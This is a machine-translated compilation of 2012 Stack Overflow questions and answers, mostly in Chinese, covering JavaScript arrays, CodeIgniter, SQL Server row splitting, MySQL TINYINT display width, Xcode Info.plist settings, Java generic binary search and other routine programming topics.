> 时间：2012-10-11T12:50:52.720

如果您需要保留现有变量（如果您不知道将首先执行哪一段代码，就会发生这种情况），您的代码不能写得更短。

当然，您可以根据需要更改默认值：

```
var array = array || ['foo']; 
```

但是如果变量已经存在，它就不会再添加`foo`了。可能不是你想要的。

**旧答案**

用你给定的例子：

```
var array = ['foo']; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:50:10.850

```
var array = [];
array.push("foo");

console.debug(array[0]); 
```

如果您不动态添加元素，那么这就足够了：

```
var array = ["foo"];
console.debug(array[0]); 
```

更新：

同样，如果您事先了解您的元素，请执行

```
 var array = array || ['foo'] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:51:45.380

不知道你想要什么`array || []`。但这就是你得到相同结果的方式：

```
var array = new Array("foo"); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-11T12:58:06.260

最短的方法是在尝试推送时检查数组是否已经定义：

```
var array = ​typeof array === 'undefined' ? ['foo'] : array.push('foo');​​​​​​​​​​ 
```

为了便于阅读，您可能需要创建一个延迟加载的 getter：

```
var addToArray = function (item) {
    // ensure array is defined
    if (typeof array === 'undefined') {
        array = [].push(item);
    }

    // redefine this function as a reference to push
    addToArray = array.push;
}; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-11T12:59:25.177

只需使用括号符号，因为它比使用 new Array() 更快。如果需要动态添加项目，则需要使用 .push(); - 或者自己处理数组的数字索引。

好的，没有阅读您上面关于异步加载脚本的评论。为什么不在加载任何其他脚本之前声明您的数组，这样您就可以确定您的数组存在？

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-11T13:01:59.570

取决于您希望如何影响传入的数组

```
var newVals = (vals || []).concat(["c","d"]); 
```

或者

```
var newVals = [].concat((vals || []), ["c","d"]); 
```

# css - 将单个转换应 用于多个 div

> ID：12839899
> 
> 赞同：0
> 
> 时间：2012-10-11T12:47:32.693
> 
> 标签：css

是否可以一次将一个 3D 转换应用于多个 DIVS？我尝试将 translate3d 应用于包含多个子 DIV 的容器 DIV，并且我认为孩子也会被转换。这里的一个特殊性是每个子 DIV 已经有自己的转换。所以我希望这些子变换矩阵乘以单个容器变换矩阵。我的方法正确吗？

# android - android列表上的按钮

> ID：12839900
> 
> 赞同：-2
> 
> 时间：2012-10-11T12:47:42.803
> 
> 标签：android, android-layout

如何从 ImageView 图标和 icon2 制作按钮？然后我在这些上设置OnClickListener 它不起作用.. 然后我点击它显示我按下所有列表项的图标。

这是我的xml：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" >

    <LinearLayout
        android:weightSum="1.0">

    <LinearLayout
        android:layout_weight=".1" >

        <ImageView
            android:id="@+id/icon" />

        <LinearLayout>

            <LinearLayout >

                <TextView
                    android:id="@+id/label"
                    android:text="KLIENTO PAVADINIMAS" />

                <ImageView 
                    android:background="@drawable/crown"/>

            </LinearLayout>

            <TextView
                android:id="@+id/label2"
                android:text="KODAS"/>

        </LinearLayout>

        </LinearLayout>

        <LinearLayout
            android:layout_weight=".9" >

            <ImageView
                android:id="@+id/icon2" />

        </LinearLayout>

    </LinearLayout>

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T13:11:41.713

> [android:clickable](http://developer.android.com/reference/android/view/View.html#attr_android%3aclickable) 定义这个视图是否响应点击事件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T13:12:45.300

你的xml里面是什么？使用[自定义 ListView](http://www.technotalkative.com/tag/android-custom-listview-example/)。

# django - 在 django 中使用 mailsnake 使用模板 id 动态创建活动

> ID：12839902
> 
> 赞同：2
> 
> 时间：2012-10-11T12:47:53.893
> 
> 标签：django, mailchimp

我使用 django 框架中的 mailsnake 从我的网站动态创建活动。想要将数据和图像直接添加到活动中，我将 html 数据添加到 postcard_heading00、postcard_image、std_content00 等部分。编写如下代码：

```
mailsnake = MailSnake('apikey')

template_option = {'list_id':xxxx, 'subject':'testing', 'from_email':'xxxxx', 'from_name':'Test', 'to_name':'', 'template_id':54457, 'inline_css':True, 'generate_text': True, 'title':'testing' }

template_content = {"html_postcard_heading00":"<h1>Testing</h1>","html_std_content00":"<h1>Testing</h1>","html_postcard_image":"<img src='image_path'>"} 
```

并将此内容传递给

```
campaignCreate(type='regular',options = template_option,content=template_content) 
```

方法。广告系列正确创建，但内容仍未添加到广告系列中。

谁能告诉我为什么会这样？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-23T09:50:38.463

问题是由于可重复部分。具有不同方式添加数据的可重复部分。更改模板内容如下。

```
template_content = {'html_repeat_1:0:postcard_heading00':postcard_heading[0],
                    'html_repeat_1:0:postcard_image': postcard_img,
                    'html_repeat_1:0:std_content00': std_content[0]} 
```

我这样做了，问题就解决了。

# php - 为每个读取数据库提供了未定义的变量 Codeigniter 和无效参数

> ID：12839906
> 
> 赞同：0
> 
> 时间：2012-10-11T12:48:06.173
> 
> 标签：php, codeigniter, foreach

我按照[说明](http://www.papatlimo.com/2011/09/simple-crud-with-codeigniter.html)从表中获取整个记录，并将它们加载到 html 表中。这是模型

```
private $namatabel;

public function __construct() {
    parent::__construct();
    $namatabel='ms_kategori_material';
}

function read()
{        
   $sql = $this->db->get($this->namatabel);  

   if($sql->num_rows() > 0)
    {     
        foreach($sql->result() as $row)
        {  
            $data[] = $row;  
        }     
        return $data;  
    } 
    else 
    {  
        return null;  
    }  

} 
```

然后使用`read()`控制器上的功能

```
public function __construct() {
    parent::__construct();
    $this->load->model('m_kategorimaterial');
}

function index()
{
    $data['c_row'] = $this->m_kategorimaterial->read();
//pass the c_row into the views  
    $this->load->view('v/vkategorimaterial', $data);  
} 
```

在视图上显示它们

```
<?php  
$no = 1;   
foreach ($c_row as $row) { ?>  
    <tr id="row">  
        <td id="no"><?php echo $no;?></td>  
        <td id="judul"><?php echo $row->Kode_Kategori_Material_Jasa;?></td>  
        <td id="kategori"><?php echo $row->Nama_Material_Jasa;?></td>                 
    </tr>  
<?php  
    $no++;  
}  
?> 
```

但后来我收到一条错误消息，提示未定义变量`c_row`和提供的参数无效`foreach()`。我以为我已经通过and 复制粘贴语句发送了`c_row`变量。什么地方出了错 ？`c_kategorimaterial/index``foreach`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T13:03:59.303

1）检查您是否通过使用正确获取数据`print_r($data)`。如果出现问题，您可能在查询中遗漏了某些内容。

2）如果你得到了完美的数据库数据，那么只需在你的模型中更改返回数组的名称。

```
function read()
{        
   $sql = $this->db->get('ms_kategori_material');  

   if($sql->num_rows() > 0)
    {     
        foreach($sql->result() as $row)
        {  
            $c_row[] = $row;  
        }     
        return $c_row;  //comment this return part while debugging
        // print_r($c_row);
        //exit;
    } 
    else 
    {  
        return null;  
    } 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T13:17:48.417

如果您打印数据数组以准确了解您在该数组中得到的内容，那会更好。尝试以下格式，可能会有所帮助

```
function getPosts() {
$query = $this->db->get('posts');
$posts = array();

foreach ($query->result() as $row) {
    $posts[] = array(
        'id' => $row->id,
        'title' => $row->title,
        'content' => $row->content
    );
}

return $posts;
} 
```

# c# - 如何在编辑模式下制作下拉列表

> ID：12839910
> 
> 赞同：-1
> 
> 时间：2012-10-11T12:48:22.817
> 
> 标签：c#, asp.net, c#-4.0

```
<asp:DropDownList ID="ddlReportFavorite" runat="server" Height="16px"
    Width="190px">
</asp:DropDownList> 
```

我需要具有`dropdownlist`可编辑性，即当用户想要键入时，它允许键入。谢谢。

**编辑**

有没有使用 Ajax Control Toolkit 的任何方法`javascript`或任何其他替代方法。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-06-13T12:23:47.853

您可以使用引导选择选择器并向您添加额外的属性，`asp:dropdownlist`例如：

```
<asp:DropDownList ID="ddlEditStatusCode"
                  runat="server"
                  CssClass="form-control selectpicker"
                  data-live-search="true"
                  data-size="10">
</asp:DropDownList>
```

您还需要添加`bootstrap-select.css`和`bootstrap-select.js`到您的网页。

结果应该是这样的：

![在此处输入图像描述](../Images/5b1811c5b0dc97679b8102467407c686.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:50:06.490

看看 ajax 控制工具包，特别是...

[http://www.asp.net/ajaxLibrary/AjaxControlToolkitSampleSite/ComboBox/ComboBox.aspx](http://www.asp.net/ajaxLibrary/AjaxControlToolkitSampleSite/ComboBox/ComboBox.aspx)

和一个不错的教程在这里

[http://www.asp.net/web-forms/tutorials/ajax-control-toolkit/combobox/how-do-i-use-the-combobox-control-cs](http://www.asp.net/web-forms/tutorials/ajax-control-toolkit/combobox/how-do-i-use-the-combobox-control-cs)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:51:28.067

看看 jQuery Searchable DropDown Plugin

[jQuery Searchable DropDown 插件演示](http://jsearchdropdown.sourceforge.net/)

# asp.net - 如何从 1.1 版访问 4.0 版组件

> ID：12839914
> 
> 赞同：1
> 
> 时间：2012-10-11T12:48:33.400
> 
> 标签：asp.net, wcf, web-services, .net-remoting

我们有一个在 1.1 版上构建的 ASP.NET 应用程序 现在我们需要在 4.0 版中加入一个新功能，其中包括一个具有网格的用户控件和许多其他控件。我们需要在 .Net 1.1 版的页面内（在框架中）显示此用户控件，这两个应用程序也在不同的服务器中。是否可以将在 4.0 版上创建的新功能添加到 1.1 版中。如果是这样，哪个是最简单和最好的方法？

# maven - Maven 发布插件：指定新的开发版本不影响 pom 的自定义属性

> ID：12839915
> 
> 赞同：1
> 
> 时间：2012-10-11T12:48:35.657
> 
> 标签：maven, maven-release-plugin

我有以下不太结构化的pom：

```
...
<groupId>xxx</groupId>
<artifactId>yyy</artifactId>
<version>0.1-SNAPSHOT</version>
<packaging>pom</packaging>

...
<properties>
    <xxx.yyy.version>0.1-SNAPSHOT</xxx.yyy.version>
</properties>

<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>xxx</groupId>
            <artifactId>aaa</artifactId>
            <version>${xxx.yyy.version}</version>
        </dependency>

        ...

    </dependencies>
</dependencyManagement> 
```

**mvn release:prepare**成功地将 pom 的版本和 xxx.yyy.version 属性的值更改为在 cmd 发布版本中指定的值（例如 0.1） - 很好，好的。之后，pugin 设置项目的新开发版本（例如 0.2-SNAPSHOT） - 这就是我遇到问题的地方：xxx.yyy.version 属性的值仍然为 0.1。为什么 xxx.yyy.version 属性没有更改为指定的新开发版本 0.2-SNAPSHOT？如何解决？提前谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T18:03:34.777

严肃的回答：考虑改用[Maven 版本号插件](http://mojo.codehaus.org/versions-maven-plugin/index.html)。我从来没有听说过关于发布插件的好消息（至少，我听过很多像你这样的故事）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-05T12:01:12.230

确保在 maven-release-plugin 配置中 updateWorkingCopyVersions 参数未设置为 false（默认为 true）。当此参数设置为 false 版本不会增加

# delphi - 使用 OLE 在 Word 文档中查找不起作用

> ID：12839923
> 
> 赞同：0
> 
> 时间：2012-10-11T12:49:03.287
> 
> 标签：delphi, ms-word, ole, delphi-5

我有以下函数，它应该返回我正在搜索的文本第一次出现的位置。问题：

*   返回 -1
*   当我将整个文档内容用作范围（或使用具有文档内容边界的范围）时，抛出 AV-s

我做了什么：

*   大量谷歌搜索，以找到问题的根源，或此代码的替代方案
*   MSDN 挖掘
*   试错

这是代码：

```
function FindTextWord(wordApp: TWordApplication; afindText: OleVariant; startIndex, endIndex: Integer; findEndOffsetFast: Boolean): Integer;
var
  matchCase        : OleVariant;
  matchWholeWord   : OleVariant;
  matchWildcards   : OleVariant;
  matchSoundsLike  : OleVariant;
  matchAllWordForms: OleVariant;
  fWd          : OleVariant;
  wrap             : OleVariant;
  format           : OleVariant;
  replaceWith      : OleVariant;
  replace          : OleVariant;
  myRange          : Range;
  startSearchOffset: OleVariant;
  endSearchOffset  : OleVariant;
begin
  WordApp.Selection.Start := 0;
  WordApp.Selection.End_ := 0;
  result:=-1;
  try
    if (Assigned(WordApp)) then
    begin

       if (startIndex<1) then
       begin
         WordApp.ActiveDocument.GrammarChecked:=true;
         WordApp.ActiveDocument.SpellingChecked:=true;
         WordApp.ActiveDocument.ShowGrammaticalErrors:=false;
         WordApp.ActiveDocument.ShowSpellingErrors:=false;
         startSearchOffset:=WordApp.ActiveDocument.Content.Start;
       end else
       begin
         startSearchOffset:=startIndex;
       end;

       if (endIndex<1) then
       begin
         if (findEndOffsetFast)or(startIndex<1) then
         begin
           endSearchOffset:=WordApp.ActiveDocument.Content.End_;
         end else
         begin
           endSearchOffset:=startSearchOffset+1;
           WordApp.Selection.Start:=startSearchOffset;
           while (WordApp.Selection.Start=startSearchOffset)and(endSearchOffset<WordApp.ActiveDocument.Content.End_)and(endSearchOffset-startSearchOffset<4000) do
           begin
             endSearchOffset:=endSearchOffset+1;
             WordApp.Selection.End_:=endSearchOffset;
           end;

           endSearchOffset:=endSearchOffset-1-Length(afindText);
         end;

       end else
       begin
         endSearchOffset:=endIndex;
       end;

       myRange:=WordApp.ActiveDocument.Range(startSearchOffset,endSearchOffset);
       myRange.Find.ClearFormatting;
       myRange.Start:=Integer(startSearchOffset);
       myRange.End_:=Integer(endSearchOffset);

       MatchCase := False;
       MatchWholeWord := TRUE;
       MatchWildcards := False;
       MatchSoundsLike := False;
       MatchAllWordForms := False;
       fWd := True;
       Wrap := wdFindStop;
       Format := False;
       ReplaceWith := '';
       Replace := wdReplaceNone;

       if MyRange.Find.Execute(aFindText,MatchCase,MatchWholeWord,
                       MatchWildcards,MatchSoundsLike,
                       MatchAllWordForms,fWd,
                       Wrap,Format,ReplaceWith,Replace)
       then begin
         if (myRange.Start>=startSearchOffset) then
         begin
           if (myRange.Find.Found) then
           begin
             result:=myRange.Start;
           end;
         end else
         begin
           result:=FindTextWord(wordApp,afindText,startIndex,endIndex,false);
         end;
       end;
     end;
   except
   end;
end; 
```

**更新**

问题不在于替换文本（我必须删除可能出现在 word 文档中的所有 HTML 标签，但有以下变化：如果我遇到格式化标签，例如 b、i、u、s、strong 等，我必须删除它们并相应地格式化文本）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T20:43:59.880

这里有一些旧的 Delphi 7 代码可​​能会有所帮助：

```
PROCEDURE TFrmBuildReport.WordGlobalReplace(Orig,Repl: String);
VAR VOrigText,vReplText,vReplWhat: OleVariant;
BEGIN
  VOrigText := Orig;
  VReplText := Repl;
  vReplWhat := wdReplaceAll;
  WAppl.ActiveDocument.Content.Find.ClearFormatting;
  WAppl.ActiveDocument.Content.Find.Replacement.ClearFormatting;
   WAppl.ActiveDocument.Content.Find.Execute(VOrigText,vE,vE,vE,vE,vE,vE,vE,vE,VReplText,vReplWhat);
END; { WordGlobalReplace } 
```

与 vE := EmptyParam;

# sql - SQL Server: split a single row into 2 rows

> ID：12839924
> 
> 赞同：0
> 
> 时间：2012-10-11T12:49:06.560
> 
> 标签：sql, sql-server-2008-r2

I'm trying to import data from an excel spreadsheet into a SQL Server 2008 database and I need to massage the data a bit first.

I've used the Data Import wizard to load it into a staging table in the database in the following format:

```
Id  ISOCode  Data
1   US       Foo
2   CA       Bar
3   US or CA Blah 
```

In cases where ISO is an OR-delimited string, eg `US or CA`, I need to split it into 2 rows, so in the final destination table it would look like this:

```
Id  ISOCode  Data
1   US       Foo
2   CA       Bar
3   US       Blah
3   CA       Blah 
```

I do have a `SplitString` table-valued function available but I'm not sure how to work it into the equation.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T13:05:22.480

Here is my solution:

```
SELECT ID, 
   CASE 
     WHEN ( ISOCODE LIKE '% or %' ) THEN LEFT(ISOCODE, Charindex('or', 
                                                       ISOCODE) - 1 
                                         ) 
     ELSE ISOCODE 
   END AS ISOCode, 
   DATA 
FROM   TBL 
UNION 
SELECT ID, 
       RIGHT(ISOCODE, Len(ISOCODE) - ( Charindex('or', ISOCODE) + 2 ))AS ISOCode 
       , 
       DATA 
FROM   TBL 
WHERE  ISOCODE LIKE '% or %' 
```

You can take a look at the full solution (with data) on [SQL Fiddle.](http://sqlfiddle.com/#!3/9e640/19)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T13:58:14.500

```
select t.Id, c.ISOCode, t.Data
from t
cross apply (select charindex(' or ', t.ISOCode) as OrIndex) idx
cross apply
(
  select t.ISOCode where idx.OrIndex = 0
  union all select left(t.ISOCode, idx.OrIndex - 1) where idx.OrIndex > 0
  union all select substring(t.ISOCode, idx.OrIndex + 4, len(t.ISoCode) - idx.OrIndex - 3) where idx.OrIndex > 0
) c 
```

(this query doesn't require 2 table scans)

# mysql - MySql：Tinyint (2) 与 tinyint(1) - 有什么区别？

> ID：12839927
> 
> 赞同：227
> 
> 时间：2012-10-11T12:49:16.490
> 
> 标签：mysql, sqldatatypes

我知道 mysql 中的布尔值是`tinyint (1)`.

今天我看到一个表定义了一个整数，比如`tinyint(2)`，还有其他的`int(4)`，`int(6)`......

大小在 integer 和 tinyint 类型的字段中意味着什么？

* * *

## 回答 #1

> 赞同：253
> 
> 时间：2012-10-11T12:56:41.287

表示列`(m)`显示宽度；MySQL 客户端等应用程序在显示查询结果时会使用此功能。

例如：

```
| v   | a   |  b  |   c |
+-----+-----+-----+-----+
| 1   | 1   |  1  |   1 |
| 10  | 10  | 10  |  10 |
| 100 | 100 | 100 | 100 | 
```

这里`a`,`b`和`c`分别使用`TINYINT(1)`,`TINYINT(2)`和`TINYINT(3)`。如您所见，它使用显示宽度填充左侧的值。

重要的是要注意它不会影响该特定类型的可接受值范围，即`TINYINT(1)`仍然接受`[-128 .. 127]`.

* * *

## 回答 #2

> 赞同：136
> 
> 时间：2016-12-02T18:33:33.943

表示**显示宽度**

无论您使用 tinyint(1) 还是 tinyint(2)，都没有任何区别。

我总是使用 tinyint(1) 和 int(11)，我使用了几个 mysql 客户端（navicat，sequel pro）。

这根本没有任何意义！我跑了一个测试，上面所有的客户端甚至命令行客户端似乎都忽略了这一点。

但是，如果您使用选项，**显示宽度**`ZEROFILL`是最重要的，例如您的表格有以下 2 列：

**一个**tinyint(2) 零填充

**B** tinyint(4) 零填充

两列的值均为 1，列**A 的**输出为**B**`01`，如下面的屏幕截图所示：）`0001`

 **[![带显示宽度的零填充](../Images/74e13a9debdeba08a3f9d6e7e722e591.png)](https://i.stack.imgur.com/L68G2.png)

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2014-04-17T07:09:19.603

```
mysql> CREATE TABLE tin3(id int PRIMARY KEY,val TINYINT(10) ZEROFILL);
Query OK, 0 rows affected (0.04 sec)

mysql> INSERT INTO tin3 VALUES(1,12),(2,7),(4,101);
Query OK, 3 rows affected (0.02 sec)
Records: 3  Duplicates: 0  Warnings: 0

mysql> SELECT * FROM tin3;
+----+------------+
| id | val        |
+----+------------+
|  1 | 0000000012 |
|  2 | 0000000007 |
|  4 | 0000000101 |
+----+------------+
3 rows in set (0.00 sec)

mysql>

mysql> SELECT LENGTH(val) FROM tin3 WHERE id=2;
+-------------+
| LENGTH(val) |
+-------------+
|          10 |
+-------------+
1 row in set (0.01 sec)

mysql> SELECT val+1 FROM tin3 WHERE id=2;
+-------+
| val+1 |
+-------+
|     8 |
+-------+
1 row in set (0.00 sec) 
```

* * *

## 回答 #4

> 赞同：17
> 
> 时间：2012-10-11T12:55:57.073

关于INT、TINYINT……这些是不同的数据类型，INT是4字节数，TINYINT是1字节数。更多信息在这里 - [INTEGER、INT、SMALLINT、TINYINT、MEDIUMINT、BIGINT](http://dev.mysql.com/doc/refman/5.5/en/numeric-types.html#integer-types)。

TINYINT 数据类型的语法是 TINYINT(M)，其中 M 表示最大显示宽度（仅在您的 MySQL 客户端支持时使用）。

[数字类型属性](http://dev.mysql.com/doc/refman/5.5/en/numeric-type-attributes.html)。**

# jquery - Zencoder 转换的 JQuery 进度条

> ID：12839928
> 
> 赞同：0
> 
> 时间：2012-10-11T12:49:20.210
> 
> 标签：jquery, notifications, zencoder

我想配置一个 jquery 进度条以从有关视频转换的 zencoder API 通知中加载。API 以 json 或 xml 的形式将通知发送到指定的 URL，但我根本不知道它的去向。请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T18:37:50.300

你需要指定你想要什么通知，以及你希望它们被发送到哪里。这方面的[指南](https://app.zencoder.com/docs/guides/getting-started/notifications)对入门非常有帮助。简而言之，您可以让它发布或通过电子邮件发送整个作业、单个输出或两者的通知。

但是，这些通知仅在作业或输出完成时发送，因此进度条对您没有太大帮助。为此，您可以查询 API 以获取[作业进度](https://app.zencoder.com/docs/api/jobs/progress)并相应地更新您的进度条。

# ios - iPhone 拼图游戏完成检测

> ID：12839934
> 
> 赞同：1
> 
> 时间：2012-10-11T12:49:37.707
> 
> 标签：ios, uiimageview, coordinates

您好正在为 iPhone 开发拼图游戏。

在这里，我几乎完成了应用程序，除了查找拼图是否完整。

这里的每一块都是一个`UIImageView`，并且它有唯一的标签。

我尝试过使用 xy 坐标，但它没有用，因为用户可以从屏幕上的任何位置开始修复拼图。

那么，知道如何检测图像是否排列正确吗？

**编辑：非常感谢最后我使用坐标完成了它。通过跟踪位置和标签。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T13:00:34.010

据推测，您有某种“对齐网格”机制，可以在每件靠近时将其精确放置到正确的位置（就像真正的拼图一样有效）。假设这被定义为每个部分的 UIImageView 原点的特定 x,y 坐标。

然后，当每一块都处于正确位置时（捕捉到它的位置），将该块的布尔值“就地”设置为“是”。

当所有部分的“就地”值为“是”时，拼图就完成了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T13:02:13.357

用 id 标记这些片段怎么样？

每件作品都有类似的东西

```
JigsawPiece.Id = 1 
```

并像这样标记它们（对于 3x3 拼图）；

```
-------------
| 0 | 1 | 2 |
-------------
| 3 | 4 | 5 |
-------------
| 6 | 7 |   | 
------------- 
```

将这些片段添加到二维数组中

```
class JigsawPuzzle:
    array[3][3] JigsawPiece; 
```

最后通过查看数字是否增加一来检查是否达到了解决方案。

```
check_id == 1
for int i = 0; i<numrows ; i++
  for int j = 0; j<numcols; j++{  
    if i==numrows - 1 and j==numcols-1: break #last one, which should be empty, skip it             
    solved = jigsawpieces[col][row].id == check_id
    check_id += 1
    if !solved: break;
  }

if solved: You solved it! 
```

一切都是伪代码，因为我不知道 ObjC

沿着这些路线的东西应该可以解决问题！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T13:04:08.413

在这里查看我的问题：[检查 UILabels are to each other](https://stackoverflow.com/questions/10957698/check-how-close-uilabels-are-to-each-other)

它是一样的，除了我问的是标签，但你可以尝试将它与图像一起使用。我很确定有不同的翻译方案

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-11T13:26:01.553

> 我尝试过使用 xy 坐标，但它没有用，因为用户可以从屏幕的任何位置开始修复它。

你必须选择一个“基础”拼图，并为其他人获取相对坐标。完成检查 - 每件都保持存储的相对位置等于当前位置。似乎，仅此而已。

另一种情况是，如果您想修复拼图，从随机块开始并按部分收集（如撕裂的图像或字母 - 块具有不同的形状）。在这种情况下，对于每个拼图，您必须存储最近的邻居 ID 及其相对位置。如果有两个相邻的部分 - 加入它们。获胜的条件 - 所有棋子的所有邻居都在相对位置。

# ios - 如何配置我的目标以在 Xcode 中使用特定的 Info.plist？

> ID：12839941
> 
> 赞同：5
> 
> 时间：2012-10-11T12:50:03.347
> 
> 标签：ios, xcode, macos, target

我有一个包含许多目标（iPhone、iPad、OS X）的 Xcode 项目。

我需要为每个目标设置不同的 Info.plist 文件。

对于 iOS，我没有遇到任何问题，一切正常。但对于 OS X，我收到以下消息：

```
No Info.plist file in application bundle or no NSPrincipalClass in the Info.plist file, exiting 
```

在我输入的 OS X 目标构建设置中：

```
Info.plist File: /MyApp/Resources/Info-osx.plist 
```

我该如何解决这个问题？有什么我忘记指定的吗？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-23T13:06:17.970

> 您是否在 OS X 目标的 info.plist 中设置了 NSPrincipalClass？NSPrincipalClass 是用于启动 OS X 应用程序的主类。

由 rckoenes 在最后的评论中

这就是解决方案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T13:04:55.983

构建设置中的 info.plist 路径在您的项目源中是相对的。如果您删除第一个`/`，它应该可以工作。

也不要`info.plist`在目标中包含 ，当您编译项目时，它会在应用程序中为您生成。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-04-03T09:21:40.207

我也遇到了同样的问题，但解决我的问题的方法是[这样](https://www.reddit.com/r/iOSProgramming/comments/5e9jgd/no_infoplist_file_in_application_bundle_or_no/)，通过设置`Create Info.plist Section in Binary`为`Yes`inside `Build Settings`。

希望它在未来对其他人有所帮助。

# java - 使用泛型 Java 对数组/比较器进行二进制搜索

> ID：12839947
> 
> 赞同：1
> 
> 时间：2012-10-11T12:50:18.080
> 
> 标签：java, arrays, generics, search, binary

我正在努力使二进制搜索的比较器在对象数组上工作。本质上，目标是搜索参差不齐的数组以找到项目的第一个匹配项或最接近的匹配项以提供插入点。该方法传入一个泛型（这是不可更改的 - 因为这是家庭作业），但你不能创建泛型类型的数组......所以，我的比较器抛出一个错误：“方法 binarySearch(Object[], Object) in类型数组不适用于参数 (Object[], E, Comparator)”。也许我需要转换通用元素“项目”？我不确定。代码：

```
private Location findFirst(E item) {
    Location current;
    int closestMatchArray1;
    int closestMatchArray2;

Object[] firstItemInArray2 = new Object[numArrayInUse];
Object firstItem;

Comparator<E> comparator = new CompareElement();

for (int i - 0; i < numArrayInUse; i++) {
    firstItem = topArray[i];
    firstItemInArray2[i] = firstItem;
}

closestMatchArray1 = Arrays.binarySearch(firstItemInArray2, item, comparator); 
```

次要但相关的问题。在比较器中，我试图调用 Comparable 方法“compareTo”来获取一个负整数，该整数给出了一个项目在失败搜索时位于数组中的大致位置，但同样，我遇到了麻烦使用泛型，出现此错误：“未定义类型 E 的方法 compareTo(E)”。代码：

```
public class CompareElement implements Comparator<E> {
  public int compare(E firstItem, E secondItem) {
     return firstItem.compareTo(secondItem);
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-12T18:24:56.557

我认为您要么需要一个，要么需要`Comparator<Object>`一个`E[]`. 对于后者，我建议查看这两篇文章：

*   [如何在 Java 中创建一个泛型数组？](https://stackoverflow.com/questions/529085/java-how-to-generic-array-creation)
*   [对象数组未转换为泛型类型](https://stackoverflow.com/questions/12401421/object-array-not-getting-cast-to-a-generic-type)

鼓励阅读以上内容。

* * *

## 选项 1：Array.newInstance()

*假设 item 永远不会为空*

根据我在上述帖子中读到的内容，如果您知道 item 永远不会`null`，您可以尝试这样的事情......

```
@SuppressWarnings("unchecked")
private Location findFirst(E item) {
    Location current;
    int closestMatchArray1;
    int closestMatchArray2;

    // Object[] firstItemInArray2 = new Object[numArrayInUse];
    // Object firstItem;

    E[] firstItemInArray2 
            = (E[]) Array.newInstance(item.getClass(), numArrayInUse); 
    E firstItem;

    Comparator<E> comparator = new CompareElement();

    for (int i = 0; i < numArrayInUse; i++) {
        firstItem = (E) topArray[i];
        firstItemInArray2[i] = firstItem;
    }

    closestMatchArray1 = Arrays.binarySearch(firstItemInArray2, item, comparator); 
```

* * *

## 选项 2：Array.newInstance()

*需要类参数*

如果不能保证 item 永远不会是`null`，并且不能对`null`值提供任何特殊处理，则可以强制`Class<?>`传入参数，如下...

```
@SuppressWarnings("unchecked")
private Location findFirst(E item, Class<E> clazz) {
    Location current;
    int closestMatchArray1;
    int closestMatchArray2;

    // Object[] firstItemInArray2 = new Object[numArrayInUse];
    // Object firstItem;

    E[] firstItemInArray2 
            = (E[]) Array.newInstance(clazz, numArrayInUse); 
    E firstItem;

    Comparator<E> comparator = new CompareElement();

    for (int i = 0; i < numArrayInUse; i++) {
        firstItem = (E) topArray[i];
        firstItemInArray2[i] = firstItem;
    }

    closestMatchArray1 = Arrays.binarySearch(firstItemInArray2, item, comparator); 
```

* * *

## 选项 3：对象比较器包装器

*丑陋，但它有效*

或者，您可以创建一个`Comparator<Object>`来包装您现有的`Comparator<E>`，如下所示（我认为这有点像 hack，但它对我来说始终如一）......

```
 private Location findFirst(E item) {
    Location current;
    int closestMatchArray1;
    int closestMatchArray2;

    Object[] firstItemInArray2 = new Object[numArrayInUse];
    Object firstItem;

    // Comparator<E> comparator = new CompareElement();
    Comparator<Object> comparator = new Comparator<Object>() {
        private final Comparator<E> delegate = new CompareElement();

        @Override
        @SuppressWarnings("unchecked")
        public int compare(Object o1, Object o2) {
            return delegate.compare((E) o1, (E) o2);
        }
    };

    for (int i = 0; i < numArrayInUse; i++) {
        firstItem = topArray[i];
        firstItemInArray2[i] = firstItem;
    }

    closestMatchArray1 = Arrays.binarySearch(firstItemInArray2, item, comparator); 
```

* * *

希望这可以帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T01:18:21.873

你在哪里`E`申报的？看起来像是在我们看不到的某个封闭类中声明的某些类型参数。您的类似乎`CompareElement`是一个比较器，它根据元素的自然顺序（即根据`Comparable`）比较元素。如果是这样，则`E`必须有一个边界来保证它能够与自身进行比较，`<E extends Comparable<? super E>>`。您可以更改声明的边界`E`，或者，如果您想像其他人建议的那样做，`CompareElement`与封闭类分开参数化，您可以这样做：

```
public class CompareElement<E extends Comparable<? super E>> implements Comparator<E> {
  public int compare(E firstItem, E secondItem) {
     return firstItem.compareTo(secondItem);
  }
} 
```

